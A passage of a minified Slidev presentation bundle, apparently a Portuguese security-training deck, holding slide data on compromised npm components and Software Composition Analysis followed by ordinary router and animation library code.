<div grid="~ cols-2 gap-4">
<p>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Credenciais roubadas (Phishing)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Minera\xE7\xE3o</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Lentid\xE3o</h3>
</p>


<div>
  <div>
    <Image style="border-radius: 10px; transition: 300ms; height: 200px; width: 450px" src="npm-hijacked-1.png" />
  </div>
  <br>
  <div>
    <Image style="border-radius: 10px; transition: 300ms; height: 200px; width: 450px" src="npm-hijacked-2.png" />
  </div>
</div>
</div>`,frontmatter:{title:"Componentes comprometidos",srcSequence:"./slides/55.components.md"},index:37,start:0,end:20,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/55.components.md",raw:`# Componentes comprometidos

<div grid="~ cols-2 gap-4">
<p>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Credenciais roubadas (Phishing)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Minera\xE7\xE3o</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Lentid\xE3o</h3>
</p>


<div>
  <div>
    <Image style="border-radius: 10px; transition: 300ms; height: 200px; width: 450px" src="npm-hijacked-1.png" />
  </div>
  <br>
  <div>
    <Image style="border-radius: 10px; transition: 300ms; height: 200px; width: 450px" src="npm-hijacked-2.png" />
  </div>
</div>
</div>`,title:"Componentes comprometidos",level:1,content:`# Componentes comprometidos

<div grid="~ cols-2 gap-4">
<p>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Credenciais roubadas (Phishing)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Minera\xE7\xE3o</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Lentid\xE3o</h3>
</p>


<div>
  <div>
    <Image style="border-radius: 10px; transition: 300ms; height: 200px; width: 450px" src="npm-hijacked-1.png" />
  </div>
  <br>
  <div>
    <Image style="border-radius: 10px; transition: 300ms; height: 200px; width: 450px" src="npm-hijacked-2.png" />
  </div>
</div>
</div>`,frontmatter:{title:"Componentes comprometidos"},index:0,start:0,end:20},inline:{raw:`---
src: ./slides/55.components.md
---
`,content:"",frontmatter:{},index:37,start:187,end:191},filepath:"/home/tux/Work/crescer/dia-2/slides/55.components.md",notesHTML:"",id:37,no:38},__clicksElements:[],__preloaded:!1}},{path:"39",name:"page-39",component:uw,meta:{title:"Software Composition Analysis (SCA)",layout:"center",class:"text-center",srcSequence:"./slides/56.sca.md",slide:{raw:null,title:"Software Composition Analysis (SCA)",level:1,content:"# Software Composition Analysis (SCA)",frontmatter:{title:"Software Composition Analysis (SCA)",layout:"center",class:"text-center",srcSequence:"./slides/56.sca.md"},index:38,start:0,end:1,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/56.sca.md",raw:"# Software Composition Analysis (SCA)",title:"Software Composition Analysis (SCA)",level:1,content:"# Software Composition Analysis (SCA)",frontmatter:{title:"Software Composition Analysis (SCA)"},index:0,start:0,end:1},inline:{raw:`---
src: ./slides/56.sca.md
layout: center
class: text-center
---`,content:"",frontmatter:{layout:"center",class:"text-center"},index:38,start:191,end:196},filepath:"/home/tux/Work/crescer/dia-2/slides/56.sca.md",notesHTML:"",id:38,no:39},__clicksElements:[],__preloaded:!1}},{path:"40",component:o8,meta:{layout:"end"}}],We=dw,pw=[{name:"play",path:"/",component:Q1,children:[...We]},{name:"print",path:"/print",component:t8},{path:"",redirect:{path:"/1"}},{path:"/:pathMatch(.*)",redirect:{path:"/1"}},{name:"presenter",path:"/presenter/:no",component:()=>fs(()=>import("./Presenter.c1867484.js"),["assets/Presenter.c1867484.js","assets/Presenter.e29290d2.css","assets/DrawingControls.vue_vue_type_script_setup_true_lang.805323b1.js"]),beforeEnter:e=>{if(!Dn.remote||Dn.remote===e.query.password)return!0;if(Dn.remote&&e.query.password===void 0){const t=prompt("Enter password");if(Dn.remote===t)return!0}return e.params.no?{path:`/${e.params.no}`}:{path:""}}},{path:"/presenter",redirect:{path:"/presenter/1"}}],bt=jg({history:sg("/crescer/dia-2/"),routes:pw});function fw(e,t,{mode:s="replace"}={}){return D({get(){const o=bt.currentRoute.value.query[e];return o==null?t!=null?t:null:Array.isArray(o)?o.filter(Boolean):o},set(o){et(()=>{bt[w(s)]({query:{...bt.currentRoute.value.query,[e]:o}})})}})}const _d=z(0);et(()=>{bt.afterEach(async()=>{await et(),_d.value+=1})});const en=D(()=>bt.currentRoute.value),ti=D(()=>en.value.query.print!==void 0),mw=D(()=>en.value.query.print==="clicks"),Yt=D(()=>en.value.query.embedded!==void 0),jt=D(()=>en.value.path.startsWith("/presenter")),Ms=D(()=>ti.value&&!mw.value),ul=D(()=>en.value.query.password),hw=D(()=>!jt.value&&(!we.remote||ul.value===we.remote)),tc=fw("clicks","0"),bd=D(()=>We.length-1),gw=D(()=>en.value.path),Ye=D(()=>parseInt(gw.value.split(/\//g).slice(-1)[0])||1);D(()=>rr(Ye.value));const gt=D(()=>We.find(e=>e.path===`${Ye.value}`));D(()=>{var e,t,s;return(s=(t=(e=gt.value)==null?void 0:e.meta)==null?void 0:t.slide)==null?void 0:s.id});D(()=>{var e,t;return(t=(e=gt.value)==null?void 0:e.meta)==null?void 0:t.layout});const Er=D(()=>We.find(e=>e.path===`${Math.min(We.length,Ye.value+1)}`)),yw=D(()=>{var e,t;return _d.value,((t=(e=gt.value)==null?void 0:e.meta)==null?void 0:t.__clicksElements)||[]}),It=D({get(){if(Ms.value)return 99999;let e=+(tc.value||0);return isNaN(e)&&(e=0),e},set(e){tc.value=e.toString()}}),No=D(()=>{var e,t,s;return+((s=(t=(e=gt.value)==null?void 0:e.meta)==null?void 0:t.clicks)!=null?s:yw.value.length)}),vw=D(()=>Ye.value<We.length-1||It.value<No.value),_w=D(()=>Ye.value>1||It.value>0),bw=D(()=>We.filter(e=>{var t,s;return(s=(t=e.meta)==null?void 0:t.slide)==null?void 0:s.title}).reduce((e,t)=>(ni(e,t),e),[])),xw=D(()=>si(bw.value,gt.value));D(()=>oi(xw.value));function un(){No.value<=It.value?Zs():It.value+=1}async function dn(){It.value<=0?await Gs():It.value-=1}function rr(e){return jt.value?`/presenter/${e}`:`/${e}`}function Zs(){const e=Math.min(We.length,Ye.value+1);return cs(e)}async function Gs(e=!0){const t=Math.max(1,Ye.value-1);await cs(t),e&&No.value&&bt.replace({query:{...en.value.query,clicks:No.value}})}function cs(e,t){return bt.push({path:rr(e),query:{...en.value.query,clicks:t}})}function ww(e){const t=z(0),{direction:s,distanceX:o,distanceY:r}=D0(e,{onSwipeStart(l){l.pointerType==="touch"&&(Ks.value||(t.value=Gr()))},onSwipeEnd(l){if(l.pointerType!=="touch"||!t.value||Ks.value)return;const i=Math.abs(o.value),a=Math.abs(r.value);i/window.innerWidth>.3||i>100?s.value===Qt.LEFT?un():dn():(a/window.innerHeight>.4||a>200)&&(s.value===Qt.DOWN?Gs():Zs())}})}async function dl(){const{saveAs:e}=await fs(()=>import("./FileSaver.min.7f56e709.js").then(t=>t.F),[]);e(Mu(we.download)?we.download:we.exportFilename?`${we.exportFilename}.pdf`:"/crescer/dia-2/slidev-exported.pdf",`${we.title}.pdf`)}async function Ew(e){var t,s;if(e==null){const o=(s=(t=gt.value)==null?void 0:t.meta)==null?void 0:s.slide;if(!(o!=null&&o.filepath))return!1;e=`${o.filepath}:${o.start}`}return await fetch(`/__open-in-editor?file=${encodeURIComponent(e)}`),!0}function ni(e,t,s=1){var r,l,i,a,c;const o=(l=(r=t.meta)==null?void 0:r.slide)==null?void 0:l.level;o&&o>s&&e.length>0?ni(e[e.length-1].children,t,s+1):e.push({children:[],level:s,path:t.path,hideInToc:Boolean((i=t.meta)==null?void 0:i.hideInToc),title:(c=(a=t.meta)==null?void 0:a.slide)==null?void 0:c.title})}function si(e,t,s=!1,o){return e.map(r=>{const l={...r,active:r.path===(t==null?void 0:t.path),hasActiveParent:s};return l.children.length>0&&(l.children=si(l.children,t,l.active||l.hasActiveParent,l)),o&&(l.active||l.activeParent)&&(o.activeParent=!0),l})}function oi(e,t=1){return e.filter(s=>!s.hideInToc).map(s=>({...s,children:oi(s.children,t+1)}))}function Aw(){const e=we.titleTemplate.replace("%s",we.title||"Slidev");Km({title:e}),sh(`${e} - shared`),ih(`${e} - drawings`);function t(){jt.value&&(sa("page",+Ye.value),sa("clicks",It.value))}bt.afterEach(t),me(It,t),oh(s=>{(+s.page!=+Ye.value||It.value!==s.clicks)&&bt.replace({path:rr(s.page),query:{...bt.currentRoute.value.query,clicks:s.clicks||0}})})}const Sw=Ae({__name:"App",setup(e){return N(U),Aw(),(t,s)=>{const o=Bo("RouterView"),r=Bo("StarportCarrier");return _(),$(Se,null,[C(o),C(r)],64)}}});function Ar(e){return e!==null&&typeof e=="object"}function pl(e,t,s=".",o){if(!Ar(t))return pl(e,{},s,o);const r=Object.assign({},t);for(const l in e){if(l==="__proto__"||l==="constructor")continue;const i=e[l];i!=null&&(o&&o(r,l,i,s)||(Array.isArray(i)&&Array.isArray(r[l])?r[l]=i.concat(r[l]):Ar(i)&&Ar(r[l])?r[l]=pl(i,r[l],(s?`${s}.`:"")+l.toString(),o):r[l]=i))}return r}function kw(e){return(...t)=>t.reduce((s,o)=>pl(s,o,"",e),{})}const Cw=kw(),xd=1/60*1e3,$w=typeof performance<"u"?()=>performance.now():()=>Date.now(),wd=typeof window<"u"?e=>window.requestAnimationFrame(e):e=>setTimeout(()=>e($w()),xd);function Dw(e){let t=[],s=[],o=0,r=!1,l=!1;const i=new WeakSet,a={schedule:(c,u=!1,d=!1)=>{const p=d&&r,f=p?t:s;return u&&i.add(c),f.indexOf(c)===-1&&(f.push(c),p&&r&&(o=t.length)),c},cancel:c=>{const u=s.indexOf(c);u!==-1&&s.splice(u,1),i.delete(c)},process:c=>{if(r){l=!0;return}if(r=!0,[t,s]=[s,t],s.length=0,o=t.length,o)for(let u=0;u<o;u++){const d=t[u];d(c),i.has(d)&&(a.schedule(d),e())}r=!1,l&&(l=!1,a.process(c))}};return a}const Bw=40;let fl=!0,Js=!1,ml=!1;const ss={delta:0,timestamp:0},oo=["read","update","preRender","render","postRender"],lr=oo.reduce((e,t)=>(e[t]=Dw(()=>Js=!0),e),{}),hl=oo.reduce((e,t)=>{const s=lr[t];return e[t]=(o,r=!1,l=!1)=>(Js||Iw(),s.schedule(o,r,l)),e},{}),Fw=oo.reduce((e,t)=>(e[t]=lr[t].cancel,e),{});oo.reduce((e,t)=>(e[t]=()=>lr[t].process(ss),e),{});const Ow=e=>lr[e].process(ss),Ed=e=>{Js=!1,ss.delta=fl?xd:Math.max(Math.min(e-ss.timestamp,Bw),1),ss.timestamp=e,ml=!0,oo.forEach(Ow),ml=!1,Js&&(fl=!1,wd(Ed))},Iw=()=>{Js=!0,fl=!0,ml||wd(Ed)},Ad=()=>ss;function Sd(e,t){var s={};for(var o in e)Object.prototype.hasOwnProperty.call(e,o)&&t.indexOf(o)<0&&(s[o]=e[o]);if(e!=null&&typeof Object.getOwnPropertySymbols=="function")for(var r=0,o=Object.getOwnPropertySymbols(e);r<o.length;r++)t.indexOf(o[r])<0&&Object.prototype.propertyIsEnumerable.call(e,o[r])&&(s[o[r]]=e[o[r]]);return s}var Tw=function(){},nc=function(){};const gl=(e,t,s)=>Math.min(Math.max(s,e),t),Sr=.001,Pw=.01,sc=10,Mw=.05,Lw=1;function Rw({duration:e=800,bounce:t=.25,velocity:s=0,mass:o=1}){let r,l;Tw(e<=sc*1e3);let i=1-t;i=gl(Mw,Lw,i),e=gl(Pw,sc,e/1e3),i<1?(r=u=>{const d=u*i,p=d*e,f=d-s,m=yl(u,i),h=Math.exp(-p);return Sr-f/m*h},l=u=>{const p=u*i*e,f=p*s+s,m=Math.pow(i,2)*Math.pow(u,2)*e,h=Math.exp(-p),x=yl(Math.pow(u,2),i);return(-r(u)+Sr>0?-1:1)*((f-m)*h)/x}):(r=u=>{const d=Math.exp(-u*e),p=(u-s)*e+1;return-Sr+d*p},l=u=>{const d=Math.exp(-u*e),p=(s-u)*(e*e);return d*p});const a=5/e,c=qw(r,l,a);if(e=e*1e3,isNaN(c))return{stiffness:100,damping:10,duration:e};{const u=Math.pow(c,2)*o;return{stiffness:u,damping:i*2*Math.sqrt(o*u),duration:e}}}const Nw=12;function qw(e,t,s){let o=s;for(let r=1;r<Nw;r++)o=o-e(o)/t(o);return o}function yl(e,t){return e*Math.sqrt(1-t*t)}const jw=["duration","bounce"],Hw=["stiffness","damping","mass"];function oc(e,t){return t.some(s=>e[s]!==void 0)}function zw(e){let t=Object.assign({velocity:0,stiffness:100,damping:10,mass:1,isResolvedFromDuration:!1},e);if(!oc(e,Hw)&&oc(e,jw)){const s=Rw(e);t=Object.assign(Object.assign(Object.assign({},t),s),{velocity:0,mass:1}),t.isResolvedFromDuration=!0}return t}function ri(e){var{from:t=0,to:s=1,restSpeed:o=2,restDelta:r}=e,l=Sd(e,["from","to","restSpeed","restDelta"]);const i={done:!1,value:t};let{stiffness:a,damping:c,mass:u,velocity:d,duration:p,isResolvedFromDuration:f}=zw(l),m=rc,h=rc;function x(){const b=d?-(d/1e3):0,k=s-t,S=c/(2*Math.sqrt(a*u)),E=Math.sqrt(a/u)/1e3;if(r===void 0&&(r=Math.min(Math.abs(s-t)/100,.4)),S<1){const B=yl(E,S);m=L=>{const P=Math.exp(-S*E*L);return s-P*((b+S*E*k)/B*Math.sin(B*L)+k*Math.cos(B*L))},h=L=>{const P=Math.exp(-S*E*L);return S*E*P*(Math.sin(B*L)*(b+S*E*k)/B+k*Math.cos(B*L))-P*(Math.cos(B*L)*(b+S*E*k)-B*k*Math.sin(B*L))}}else if(S===1)m=B=>s-Math.exp(-E*B)*(k+(b+E*k)*B);else{const B=E*Math.sqrt(S*S-1);m=L=>{const P=Math.exp(-S*E*L),H=Math.min(B*L,300);return s-P*((b+S*E*k)*Math.sinh(H)+B*k*Math.cosh(H))/B}}}return x(),{next:b=>{const k=m(b);if(f)i.done=b>=p;else{const S=h(b)*1e3,E=Math.abs(S)<=o,B=Math.abs(s-k)<=r;i.done=E&&B}return i.value=i.done?s:k,i},flipTarget:()=>{d=-d,[t,s]=[s,t],x()}}}ri.needsInterpolation=(e,t)=>typeof e=="string"||typeof t=="string";const rc=e=>0,kd=(e,t,s)=>{const o=t-e;return o===0?1:(s-e)/o},li=(e,t,s)=>-s*e+s*t+e,Cd=(e,t)=>s=>Math.max(Math.min(s,t),e),Ls=e=>e%1?Number(e.toFixed(5)):e,eo=/(-)?([\d]*\.?[\d])+/g,vl=/(#[0-9a-f]{6}|#[0-9a-f]{3}|#(?:[0-9a-f]{2}){2,4}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2}(-?[\d\.]+%?)\s*[\,\/]?\s*[\d\.]*%?\))/gi,Vw=/^(#[0-9a-f]{3}|#(?:[0-9a-f]{2}){2,4}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2}(-?[\d\.]+%?)\s*[\,\/]?\s*[\d\.]*%?\))$/i;function ro(e){return typeof e=="string"}const lo={test:e=>typeof e=="number",parse:parseFloat,transform:e=>e},Rs=Object.assign(Object.assign({},lo),{transform:Cd(0,1)}),yo=Object.assign(Object.assign({},lo),{default:1}),ii=e=>({test:t=>ro(t)&&t.endsWith(e)&&t.split(" ").length===1,parse:parseFloat,transform:t=>`${t}${e}`}),bn=ii("deg"),Ns=ii("%"),ae=ii("px"),lc=Object.assign(Object.assign({},Ns),{parse:e=>Ns.parse(e)/100,transform:e=>Ns.transform(e*100)}),ai=(e,t)=>s=>Boolean(ro(s)&&Vw.test(s)&&s.startsWith(e)||t&&Object.prototype.hasOwnProperty.call(s,t)),$d=(e,t,s)=>o=>{if(!ro(o))return o;const[r,l,i,a]=o.match(eo);return{[e]:parseFloat(r),[t]:parseFloat(l),[s]:parseFloat(i),alpha:a!==void 0?parseFloat(a):1}},Fn={test:ai("hsl","hue"),parse:$d("hue","saturation","lightness"),transform:({hue:e,saturation:t,lightness:s,alpha:o=1})=>"hsla("+Math.round(e)+", "+Ns.transform(Ls(t))+", "+Ns.transform(Ls(s))+", "+Ls(Rs.transform(o))+")"},Uw=Cd(0,255),kr=Object.assign(Object.assign({},lo),{transform:e=>Math.round(Uw(e))}),rn={test:ai("rgb","red"),parse:$d("red","green","blue"),transform:({red:e,green:t,blue:s,alpha:o=1})=>"rgba("+kr.transform(e)+", "+kr.transform(t)+", "+kr.transform(s)+", "+Ls(Rs.transform(o))+")"};function Ww(e){let t="",s="",o="",r="";return e.length>5?(t=e.substr(1,2),s=e.substr(3,2),o=e.substr(5,2),r=e.substr(7,2)):(t=e.substr(1,1),s=e.substr(2,1),o=e.substr(3,1),r=e.substr(4,1),t+=t,s+=s,o+=o,r+=r),{red:parseInt(t,16),green:parseInt(s,16),blue:parseInt(o,16),alpha:r?parseInt(r,16)/255:1}}const _l={test:ai("#"),parse:Ww,transform:rn.transform},ut={test:e=>rn.test(e)||_l.test(e)||Fn.test(e),parse:e=>rn.test(e)?rn.parse(e):Fn.test(e)?Fn.parse(e):_l.parse(e),transform:e=>ro(e)?e:e.hasOwnProperty("red")?rn.transform(e):Fn.transform(e)},Dd="${c}",Bd="${n}";function Yw(e){var t,s,o,r;return isNaN(e)&&ro(e)&&((s=(t=e.match(eo))===null||t===void 0?void 0:t.length)!==null&&s!==void 0?s:0)+((r=(o=e.match(vl))===null||o===void 0?void 0:o.length)!==null&&r!==void 0?r:0)>0}function Fd(e){typeof e=="number"&&(e=`${e}`);const t=[];let s=0;const o=e.match(vl);o&&(s=o.length,e=e.replace(vl,Dd),t.push(...o.map(ut.parse)));const r=e.match(eo);return r&&(e=e.replace(eo,Bd),t.push(...r.map(lo.parse))),{values:t,numColors:s,tokenised:e}}function Od(e){return Fd(e).values}function Id(e){const{values:t,numColors:s,tokenised:o}=Fd(e),r=t.length;return l=>{let i=o;for(let a=0;a<r;a++)i=i.replace(a<s?Dd:Bd,a<s?ut.transform(l[a]):Ls(l[a]));return i}}const Kw=e=>typeof e=="number"?0:e;function Xw(e){const t=Od(e);return Id(e)(t.map(Kw))}const io={test:Yw,parse:Od,createTransformer:Id,getAnimatableNone:Xw},Qw=new Set(["brightness","contrast","saturate","opacity"]);function Zw(e){let[t,s]=e.slice(0,-1).split("(");if(t==="drop-shadow")return e;const[o]=s.match(eo)||[];if(!o)return e;const r=s.replace(o,"");let l=Qw.has(t)?1:0;return o!==s&&(l*=100),t+"("+l+r+")"}const Gw=/([a-z-]*)\(.*?\)/g,bl=Object.assign(Object.assign({},io),{getAnimatableNone:e=>{const t=e.match(Gw);return t?t.map(Zw).join(" "):e}});function Cr(e,t,s){return s<0&&(s+=1),s>1&&(s-=1),s<1/6?e+(t-e)*6*s:s<1/2?t:s<2/3?e+(t-e)*(2/3-s)*6:e}function ic({hue:e,saturation:t,lightness:s,alpha:o}){e/=360,t/=100,s/=100;let r=0,l=0,i=0;if(!t)r=l=i=s;else{const a=s<.5?s*(1+t):s+t-s*t,c=2*s-a;r=Cr(c,a,e+1/3),l=Cr(c,a,e),i=Cr(c,a,e-1/3)}return{red:Math.round(r*255),green:Math.round(l*255),blue:Math.round(i*255),alpha:o}}const Jw=(e,t,s)=>{const o=e*e,r=t*t;return Math.sqrt(Math.max(0,s*(r-o)+o))},e4=[_l,rn,Fn],ac=e=>e4.find(t=>t.test(e)),Td=(e,t)=>{let s=ac(e),o=ac(t),r=s.parse(e),l=o.parse(t);s===Fn&&(r=ic(r),s=rn),o===Fn&&(l=ic(l),o=rn);const i=Object.assign({},r);return a=>{for(const c in i)c!=="alpha"&&(i[c]=Jw(r[c],l[c],a));return i.alpha=li(r.alpha,l.alpha,a),s.transform(i)}},t4=e=>typeof e=="number",n4=(e,t)=>s=>t(e(s)),Pd=(...e)=>e.reduce(n4);function Md(e,t){return t4(e)?s=>li(e,t,s):ut.test(e)?Td(e,t):Rd(e,t)}const Ld=(e,t)=>{const s=[...e],o=s.length,r=e.map((l,i)=>Md(l,t[i]));return l=>{for(let i=0;i<o;i++)s[i]=r[i](l);return s}},s4=(e,t)=>{const s=Object.assign(Object.assign({},e),t),o={};for(const r in s)e[r]!==void 0&&t[r]!==void 0&&(o[r]=Md(e[r],t[r]));return r=>{for(const l in o)s[l]=o[l](r);return s}};function cc(e){const t=io.parse(e),s=t.length;let o=0,r=0,l=0;for(let i=0;i<s;i++)o||typeof t[i]=="number"?o++:t[i].hue!==void 0?l++:r++;return{parsed:t,numNumbers:o,numRGB:r,numHSL:l}}const Rd=(e,t)=>{const s=io.createTransformer(t),o=cc(e),r=cc(t);return o.numHSL===r.numHSL&&o.numRGB===r.numRGB&&o.numNumbers>=r.numNumbers?Pd(Ld(o.parsed,r.parsed),s):i=>`${i>0?t:e}`},o4=(e,t)=>s=>li(e,t,s);function r4(e){if(typeof e=="number")return o4;if(typeof e=="string")return ut.test(e)?Td:Rd;if(Array.isArray(e))return Ld;if(typeof e=="object")return s4}function l4(e,t,s){const o=[],r=s||r4(e[0]),l=e.length-1;for(let i=0;i<l;i++){let a=r(e[i],e[i+1]);if(t){const c=Array.isArray(t)?t[i]:t;a=Pd(c,a)}o.push(a)}return o}function i4([e,t],[s]){return o=>s(kd(e,t,o))}function a4(e,t){const s=e.length,o=s-1;return r=>{let l=0,i=!1;if(r<=e[0]?i=!0:r>=e[o]&&(l=o-1,i=!0),!i){let c=1;for(;c<s&&!(e[c]>r||c===o);c++);l=c-1}const a=kd(e[l],e[l+1],r);return t[l](a)}}function Nd(e,t,{clamp:s=!0,ease:o,mixer:r}={}){const l=e.length;nc(l===t.length),nc(!o||!Array.isArray(o)||o.length===l-1),e[0]>e[l-1]&&(e=[].concat(e),t=[].concat(t),e.reverse(),t.reverse());const i=l4(t,o,r),a=l===2?i4(e,i):a4(e,i);return s?c=>a(gl(e[0],e[l-1],c)):a}const ir=e=>t=>1-e(1-t),ci=e=>t=>t<=.5?e(2*t)/2:(2-e(2*(1-t)))/2,c4=e=>t=>Math.pow(t,e),qd=e=>t=>t*t*((e+1)*t-e),u4=e=>{const t=qd(e);return s=>(s*=2)<1?.5*t(s):.5*(2-Math.pow(2,-10*(s-1)))},jd=1.525,d4=4/11,p4=8/11,f4=9/10,Hd=e=>e,ui=c4(2),m4=ir(ui),zd=ci(ui),Vd=e=>1-Math.sin(Math.acos(e)),Ud=ir(Vd),h4=ci(Ud),di=qd(jd),g4=ir(di),y4=ci(di),v4=u4(jd),_4=4356/361,b4=35442/1805,x4=16061/1805,qo=e=>{if(e===1||e===0)return e;const t=e*e;return e<d4?7.5625*t:e<p4?9.075*t-9.9*e+3.4:e<f4?_4*t-b4*e+x4:10.8*e*e-20.52*e+10.72},w4=ir(qo),E4=e=>e<.5?.5*(1-qo(1-e*2)):.5*qo(e*2-1)+.5;function A4(e,t){return e.map(()=>t||zd).splice(0,e.length-1)}function S4(e){const t=e.length;return e.map((s,o)=>o!==0?o/(t-1):0)}function k4(e,t){return e.map(s=>s*t)}function So({from:e=0,to:t=1,ease:s,offset:o,duration:r=300}){const l={done:!1,value:e},i=Array.isArray(t)?t:[e,t],a=k4(o&&o.length===i.length?o:S4(i),r);function c(){return Nd(a,i,{ease:Array.isArray(s)?s:A4(i,s)})}let u=c();return{next:d=>(l.value=u(d),l.done=d>=r,l),flipTarget:()=>{i.reverse(),u=c()}}}function C4({velocity:e=0,from:t=0,power:s=.8,timeConstant:o=350,restDelta:r=.5,modifyTarget:l}){const i={done:!1,value:t};let a=s*e;const c=t+a,u=l===void 0?c:l(c);return u!==c&&(a=u-t),{next:d=>{const p=-a*Math.exp(-d/o);return i.done=!(p>r||p<-r),i.value=i.done?u:u+p,i},flipTarget:()=>{}}}const uc={keyframes:So,spring:ri,decay:C4};function $4(e){if(Array.isArray(e.to))return So;if(uc[e.type])return uc[e.type];const t=new Set(Object.keys(e));return t.has("ease")||t.has("duration")&&!t.has("dampingRatio")?So:t.has("dampingRatio")||t.has("stiffness")||t.has("mass")||t.has("damping")||t.has("restSpeed")||t.has("restDelta")?ri:So}function Wd(e,t,s=0){return e-t-s}function D4(e,t,s=0,o=!0){return o?Wd(t+-e,t,s):t-(e-t)+s}function B4(e,t,s,o){return o?e>=t+s:e<=-s}const F4=e=>{const t=({delta:s})=>e(s);return{start:()=>hl.update(t,!0),stop:()=>Fw.update(t)}};function Yd(e){var t,s,{from:o,autoplay:r=!0,driver:l=F4,elapsed:i=0,repeat:a=0,repeatType:c="loop",repeatDelay:u=0,onPlay:d,onStop:p,onComplete:f,onRepeat:m,onUpdate:h}=e,x=Sd(e,["from","autoplay","driver","elapsed","repeat","repeatType","repeatDelay","onPlay","onStop","onComplete","onRepeat","onUpdate"]);let{to:b}=x,k,S=0,E=x.duration,B,L=!1,P=!0,H;const te=$4(x);!((s=(t=te).needsInterpolation)===null||s===void 0)&&s.call(t,o,b)&&(H=Nd([0,100],[o,b],{clamp:!1}),o=0,b=100);const le=te(Object.assign(Object.assign({},x),{from:o,to:b}));function ye(){S++,c==="reverse"?(P=S%2===0,i=D4(i,E,u,P)):(i=Wd(i,E,u),c==="mirror"&&le.flipTarget()),L=!1,m&&m()}function _e(){k.stop(),f&&f()}function ze(qe){if(P||(qe=-qe),i+=qe,!L){const Ie=le.next(Math.max(0,i));B=Ie.value,H&&(B=H(B)),L=P?Ie.done:i<=0}h==null||h(B),L&&(S===0&&(E!=null||(E=i)),S<a?B4(i,E,u,P)&&ye():_e())}function Ve(){d==null||d(),k=l(ze),k.start()}return r&&Ve(),{stop:()=>{p==null||p(),k.stop()}}}function Kd(e,t){return t?e*(1e3/t):0}function O4({from:e=0,velocity:t=0,min:s,max:o,power:r=.8,timeConstant:l=750,bounceStiffness:i=500,bounceDamping:a=10,restDelta:c=1,modifyTarget:u,driver:d,onUpdate:p,onComplete:f,onStop:m}){let h;function x(E){return s!==void 0&&E<s||o!==void 0&&E>o}function b(E){return s===void 0?o:o===void 0||Math.abs(s-E)<Math.abs(o-E)?s:o}function k(E){h==null||h.stop(),h=Yd(Object.assign(Object.assign({},E),{driver:d,onUpdate:B=>{var L;p==null||p(B),(L=E.onUpdate)===null||L===void 0||L.call(E,B)},onComplete:f,onStop:m}))}function S(E){k(Object.assign({type:"spring",stiffness:i,damping:a,restDelta:c},E))}if(x(e))S({from:e,velocity:t,to:b(e)});else{let E=r*t+e;typeof u<"u"&&(E=u(E));const B=b(E),L=B===s?-1:1;let P,H;const te=le=>{P=H,H=le,t=Kd(le-P,Ad().delta),(L===1&&le>B||L===-1&&le<B)&&S({from:le,to:B,velocity:t})};k({type:"decay",from:e,velocity:t,timeConstant:l,power:r,restDelta:c,modifyTarget:u,onUpdate:x(E)?te:void 0})}return{stop:()=>h==null?void 0:h.stop()}}const Xd=(e,t)=>1-3*t+3*e,Qd=(e,t)=>3*t-6*e,Zd=e=>3*e,jo=(e,t,s)=>((Xd(t,s)*e+Qd(t,s))*e+Zd(t))*e,Gd=(e,t,s)=>3*Xd(t,s)*e*e+2*Qd(t,s)*e+Zd(t),I4=1e-7,T4=10;function P4(e,t,s,o,r){let l,i,a=0;do i=t+(s-t)/2,l=jo(i,o,r)-e,l>0?s=i:t=i;while(Math.abs(l)>I4&&++a<T4);return i}const M4=8,L4=.001;function R4(e,t,s,o){for(let r=0;r<M4;++r){const l=Gd(t,s,o);if(l===0)return t;t-=(jo(t,s,o)-e)/l}return t}const ko=11,vo=1/(ko-1);function N4(e,t,s,o){if(e===t&&s===o)return Hd;const r=new Float32Array(ko);for(let i=0;i<ko;++i)r[i]=jo(i*vo,e,s);function l(i){let a=0,c=1;const u=ko-1;for(;c!==u&&r[c]<=i;++c)a+=vo;--c;const d=(i-r[c])/(r[c+1]-r[c]),p=a+d*vo,f=Gd(p,e,s);return f>=L4?R4(i,p,e,s):f===0?p:P4(i,a,a+vo,e,s)}return i=>i===0||i===1?i:jo(l(i),t,o)}const $r={};class q4{constructor(){this.subscriptions=new Set}add(t){return this.subscriptions.add(t),()=>this.subscriptions.delete(t)}notify(t,s,o){if(!!this.subscriptions.size)for(const r of this.subscriptions)r(t,s,o)}clear(){this.subscriptions.clear()}}const dc=e=>!isNaN(parseFloat(e));class j4{constructor(t){this.timeDelta=0,this.lastUpdated=0,this.updateSubscribers=new q4,this.canTrackVelocity=!1,this.updateAndNotify=s=>{this.prev=this.current,this.current=s;const{delta:o,timestamp:r}=Ad();this.lastUpdated!==r&&(this.timeDelta=o,this.lastUpdated=r),hl.postRender(this.scheduleVelocityCheck),this.updateSubscribers.notify(this.current)},this.scheduleVelocityCheck=()=>hl.postRender(this.velocityCheck),this.velocityCheck=({timestamp:s})=>{this.canTrackVelocity||(this.canTrackVelocity=dc(this.current)),s!==this.lastUpdated&&(this.prev=this.current)},this.prev=this.current=t,this.canTrackVelocity=dc(this.current)}onChange(t){return this.updateSubscribers.add(t)}clearListeners(){this.updateSubscribers.clear()}set(t){this.updateAndNotify(t)}get(){return this.current}getPrevious(){return this.prev}getVelocity(){return this.canTrackVelocity?Kd(parseFloat(this.current)-parseFloat(this.prev),this.timeDelta):0}start(t){return this.stop(),new Promise(s=>{const{stop:o}=t(s);this.stopAnimation=o}).then(()=>this.clearAnimation())}stop(){this.stopAnimation&&this.stopAnimation(),this.clearAnimation()}isAnimating(){return!!this.stopAnimation}clearAnimation(){this.stopAnimation=null}destroy(){this.updateSubscribers.clear(),this.stop()}}function H4(e){return new j4(e)}const{isArray:z4}=Array;function V4(){const e=z({}),t=o=>{const r=l=>{!e.value[l]||(e.value[l].stop(),e.value[l].destroy(),delete e.value[l])};o?z4(o)?o.forEach(r):r(o):Object.keys(e.value).forEach(r)},s=(o,r,l)=>{if(e.value[o])return e.value[o];const i=H4(r);return 